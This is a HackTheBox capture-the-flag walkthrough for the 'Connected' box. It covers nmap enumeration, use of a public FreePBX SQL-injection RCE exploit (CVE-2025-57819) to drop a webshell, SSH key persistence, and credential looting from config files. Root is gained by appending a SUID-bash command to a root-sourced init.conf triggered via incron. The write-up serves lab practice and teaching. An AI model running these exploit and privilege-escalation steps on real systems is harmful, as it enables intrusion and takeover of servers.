---
title: HackTheBox - Connected
date: 2026-11-03
image: cover.png
tags: [HackTheBox, Easy, Linux]
platform: HackTheBox
os: Linux
difficulty: Easy
points: 45
released: 2026-06-06
ip: 
boxAvatar: htb-cover.png
excerpt: 
active: "Password123!"
---

# Connected

### <u>NMAP Scanning</u>

```bash
PORT    STATE SERVICE   REASON         VERSION
22/tcp  open  ssh       syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZBL8VwwAo5nMO8NKi+tOD98pIamOTde7sVlAJmP1Lp5urgs8hzvYIVElaEWZdxjHZM5hggtGg8Tmqzn2tOeNsN3rh/JTcXCjtc2izUuwLb18s5GgMHkBooT6UBCdcztPySFILnedHcFusfxSPTVTSIrwGaxLKULJ/qn2ClQ6BBp60NqQg0Da93fbm/5NS6OtZYdWdfcW4oyN/LWQcfFo/OYFjzWng+1pU+gfeuWic4iW2eg9qmWq43Och4oNJ3VAYh8MpXaKuoaDi+J7R6f60ADTQ6Kg/oSHKj8RV0zySax8qHt+Q2987wcdXuCnI+6oREQIUHu1s3z+rmnT2k4Mx
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH4ZlpWhdGD2bgi63EUvvzRx/sv8EvmVBLOFPVarhdPQcqCL69SyCtU0JLlNqdLxKGUbh5t1/9BvGU7+cXZdt1E=
|   256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5pB+WpL08kZ9YCgPA7QRnKjCsHY/R9oNeUQF1LD5Ms
80/tcp  open  http      syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-title: 404 Not Found
|_Requested resource was config.php
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https syn-ack ttl 63 Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-methods:
|_  Supported Methods: GET HEAD POST
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@pbxconnect/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@pbxconnect/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-30T14:07:27
| Not valid after:  2026-11-30T14:07:27
| MD5:   2530:86e8:e962:6d48:36f8:e524:bf79:cc5a
| SHA-1: 6997:e786:d78e:2d0a:dcb4:f449:7f65:ba12:52ef:0466
| -----BEGIN CERTIFICATE-----
| MIID4jCCAsqgAwIBAgICAOgwDQYJKoZIhvcNAQELBQAwgaUxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MRMwEQYDVQQDDApwYnhjb25uZWN0MR4wHAYJKoZIhvcNAQkBFg9yb290QHBi
| eGNvbm5lY3QwHhcNMjUxMTMwMTQwNzI3WhcNMjYxMTMwMTQwNzI3WjCBpTELMAkG
| A1UEBhMCLS0xEjAQBgNVBAgMCVNvbWVTdGF0ZTERMA8GA1UEBwwIU29tZUNpdHkx
| GTAXBgNVBAoMEFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsMFlNvbWVPcmdhbml6
| YXRpb25hbFVuaXQxEzARBgNVBAMMCnBieGNvbm5lY3QxHjAcBgkqhkiG9w0BCQEW
| D3Jvb3RAcGJ4Y29ubmVjdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ALHeypjH6abbs3T5INa8PZP8w90Xjj0PJ68myliRayEhZKmQL/FbL+9XLIaRGxMI
| 3fXLvn0Sw2AfDWWpkFEMckSokGZK2MTp4CYooo4DvNIiggms4xZ2aLY35zsU45II
| EzVB6OAtd8imI6h/D/YEaOvFQFPtXb9gzB0edJP55gjkCIYAt95oLAZLbUa5u0r9
| OhjBPuqVQE0f6oqsZh/1UnZcsscDw51r7jKGx2+uSpVb6dxMM9y2XX/XC26g4VbA
| noHrbagpbisbDwGIhQU19znUT2iYVpNBV3I9ehiVB7FFC7+cT8LIgpJ+KtXM/cjg
| dsxJ+sVzuB02MCS6ly0PbjMCAwEAAaMaMBgwCQYDVR0TBAIwADALBgNVHQ8EBAMC
| BeAwDQYJKoZIhvcNAQELBQADggEBAHdARF+ZdnUhYCaB5lowDM1sxWS9F8kkECOh
| 3D/d/LeJ7c6RRR0Ktmw6/4zRCW1bDUkjtdz4idYRYGyivkYobhX3NvhV5ghslMw3
| UDjGexJToW7Qk5YNSIeKkfR89Tg2DkJzlUs4b1DT+ZaGgCto7x8mrzXcT0ktDyK1
| nHqmiKXuVFtwLpnJxXArPkhiH7TYgGaeUZw8U6z7EUBtgnn8BESAB+LQ2n4OQnbE
| lJS2230sbxaxiOpt83EN97CnusGePjqpiUXxPJVc0LA5U7mZiqhojAFWRSOMax7l
| yzYI6PipGEKHexXmy4DTfm/n0xR4HRITygOgW28l6qiXtAME9hw=
|_-----END CERTIFICATE-----
```

### <u>SSH - Banner Grabbing</u>

→ Command: `nc -vn 10.129.245.100 22`

{% image %}

→ Output:

```bash
➜  connected nc -vn 10.129.245.100 22
(UNKNOWN) [10.129.245.100] 22 (ssh) open
SSH-2.0-OpenSSH_7.4
```

### <u>WebServer Enumeration</u>

If we do a simple `curl -i` on the IP we can see that we are being redirected to `connected.htb` :

{% image2 %}

So let’s add this to our `/etc/hosts` file:

```bash
➜  connected cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.245.100	connected.htb
```

Now if we go to the page we can see that it’s hoting FreePBX:

{% image3 %}

If we search for this version we can see that there are multiples CVEs including an unauthenticated SQL injection leading to an RCE:

{% image4 %}

So we searched for a public exploit and found one by watchtowrlabs ( [https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819) ). The problem is that the page is very slow so we decreased the mtu from 1500 to 1200:

```bash
ip link show tun0
```

{% image5 %}

And now after decreasing it we should have 1200: `sudo ip link set dev tun0 mtu 1200`

{% image6 %}

### <u>FreePBX - Remote Code Execution</u>

After cloning the repo and using the exploit we can see that we successfully created a webshell which we can use:

→ Command: `python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://connected.htb/`

{% image7 %}

And if we curl that webshell and change the command we can see that we can run commands:

{% image8 %}

And now since we have access to the `asterisk` user - we can create a `.ssh` folder and put our public key into the `authorized_keys` folder:

{% image9 %}

Once we obtained a stable connection using ssh we can grab the first flag and start our privilege escalation journey.

### <u>Privilege Escalation - Pillaging & Situational Awareness</u>

If we inspect the network and look for open ports we can see that multiple are running on localhost:

→ Command: `netstat -tulpn`

{% image10 %}

If we search for where FreePBX stores it’s secrets we can see that it’s under `/etc/freepbx.conf` and `/etc/amportal.conf`:

{% image11 %}

Now using those credentials we can connect to the mysql database and inspect it:

{% image12 %}

If we want to see the tables containing `user` inside of them we can use the following query:

```bash
MariaDB [asterisk]> SHOW TABLES LIKE '%user%';
```

{% image13 %}

The interesting table here is `ampusers` which contain the password sha of the user admin:

{% image14 %}

But if we try to crack it we can see that it’s unfortunately not working:

{% image15 %}

### <u>Incrontab</u>

If we launch linpeas we can find something very interesting:

{% image16 %}

And if we scroll a little bit down we can see the following:

```bash
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

{% image17 %}

If we check `/usr/sbin/sysadmin_dahdi_restart` we can see that it’s doing 2 things:

{% image18 %}

It’s firstly stopping asterisk and then restarting dahdi - so let’s look inside of this:

```bash
-bash-4.2$ grep -n "init.conf" /etc/init.d/dahdi
9:# config: /etc/dahdi/init.conf
25:# Don't edit the following values. Edit /etc/dahdi/init.conf instead.
69:[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
-bash-4.2$
```

We can see that on line 69 is doing dot sourcing - meaning that it runs the file’s contents inline, in that same root shell.

If we check the permissions on this file we can see that it’s owned by asterisk and we can modify it:

{% image19 %}

So we will do the following commands:

```bash
printf '\n install -m 4755 /bin/bash /home/asterisk/pwnage \n' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

And we will wait a couple of seconds and we should see the SUID root bash `/home/asterisk/pwnage`:

{% image20 %}

And now to use the bash as root we need to `./pwange -p` and we can see that we are root and can get the root flag:

{% image21 %}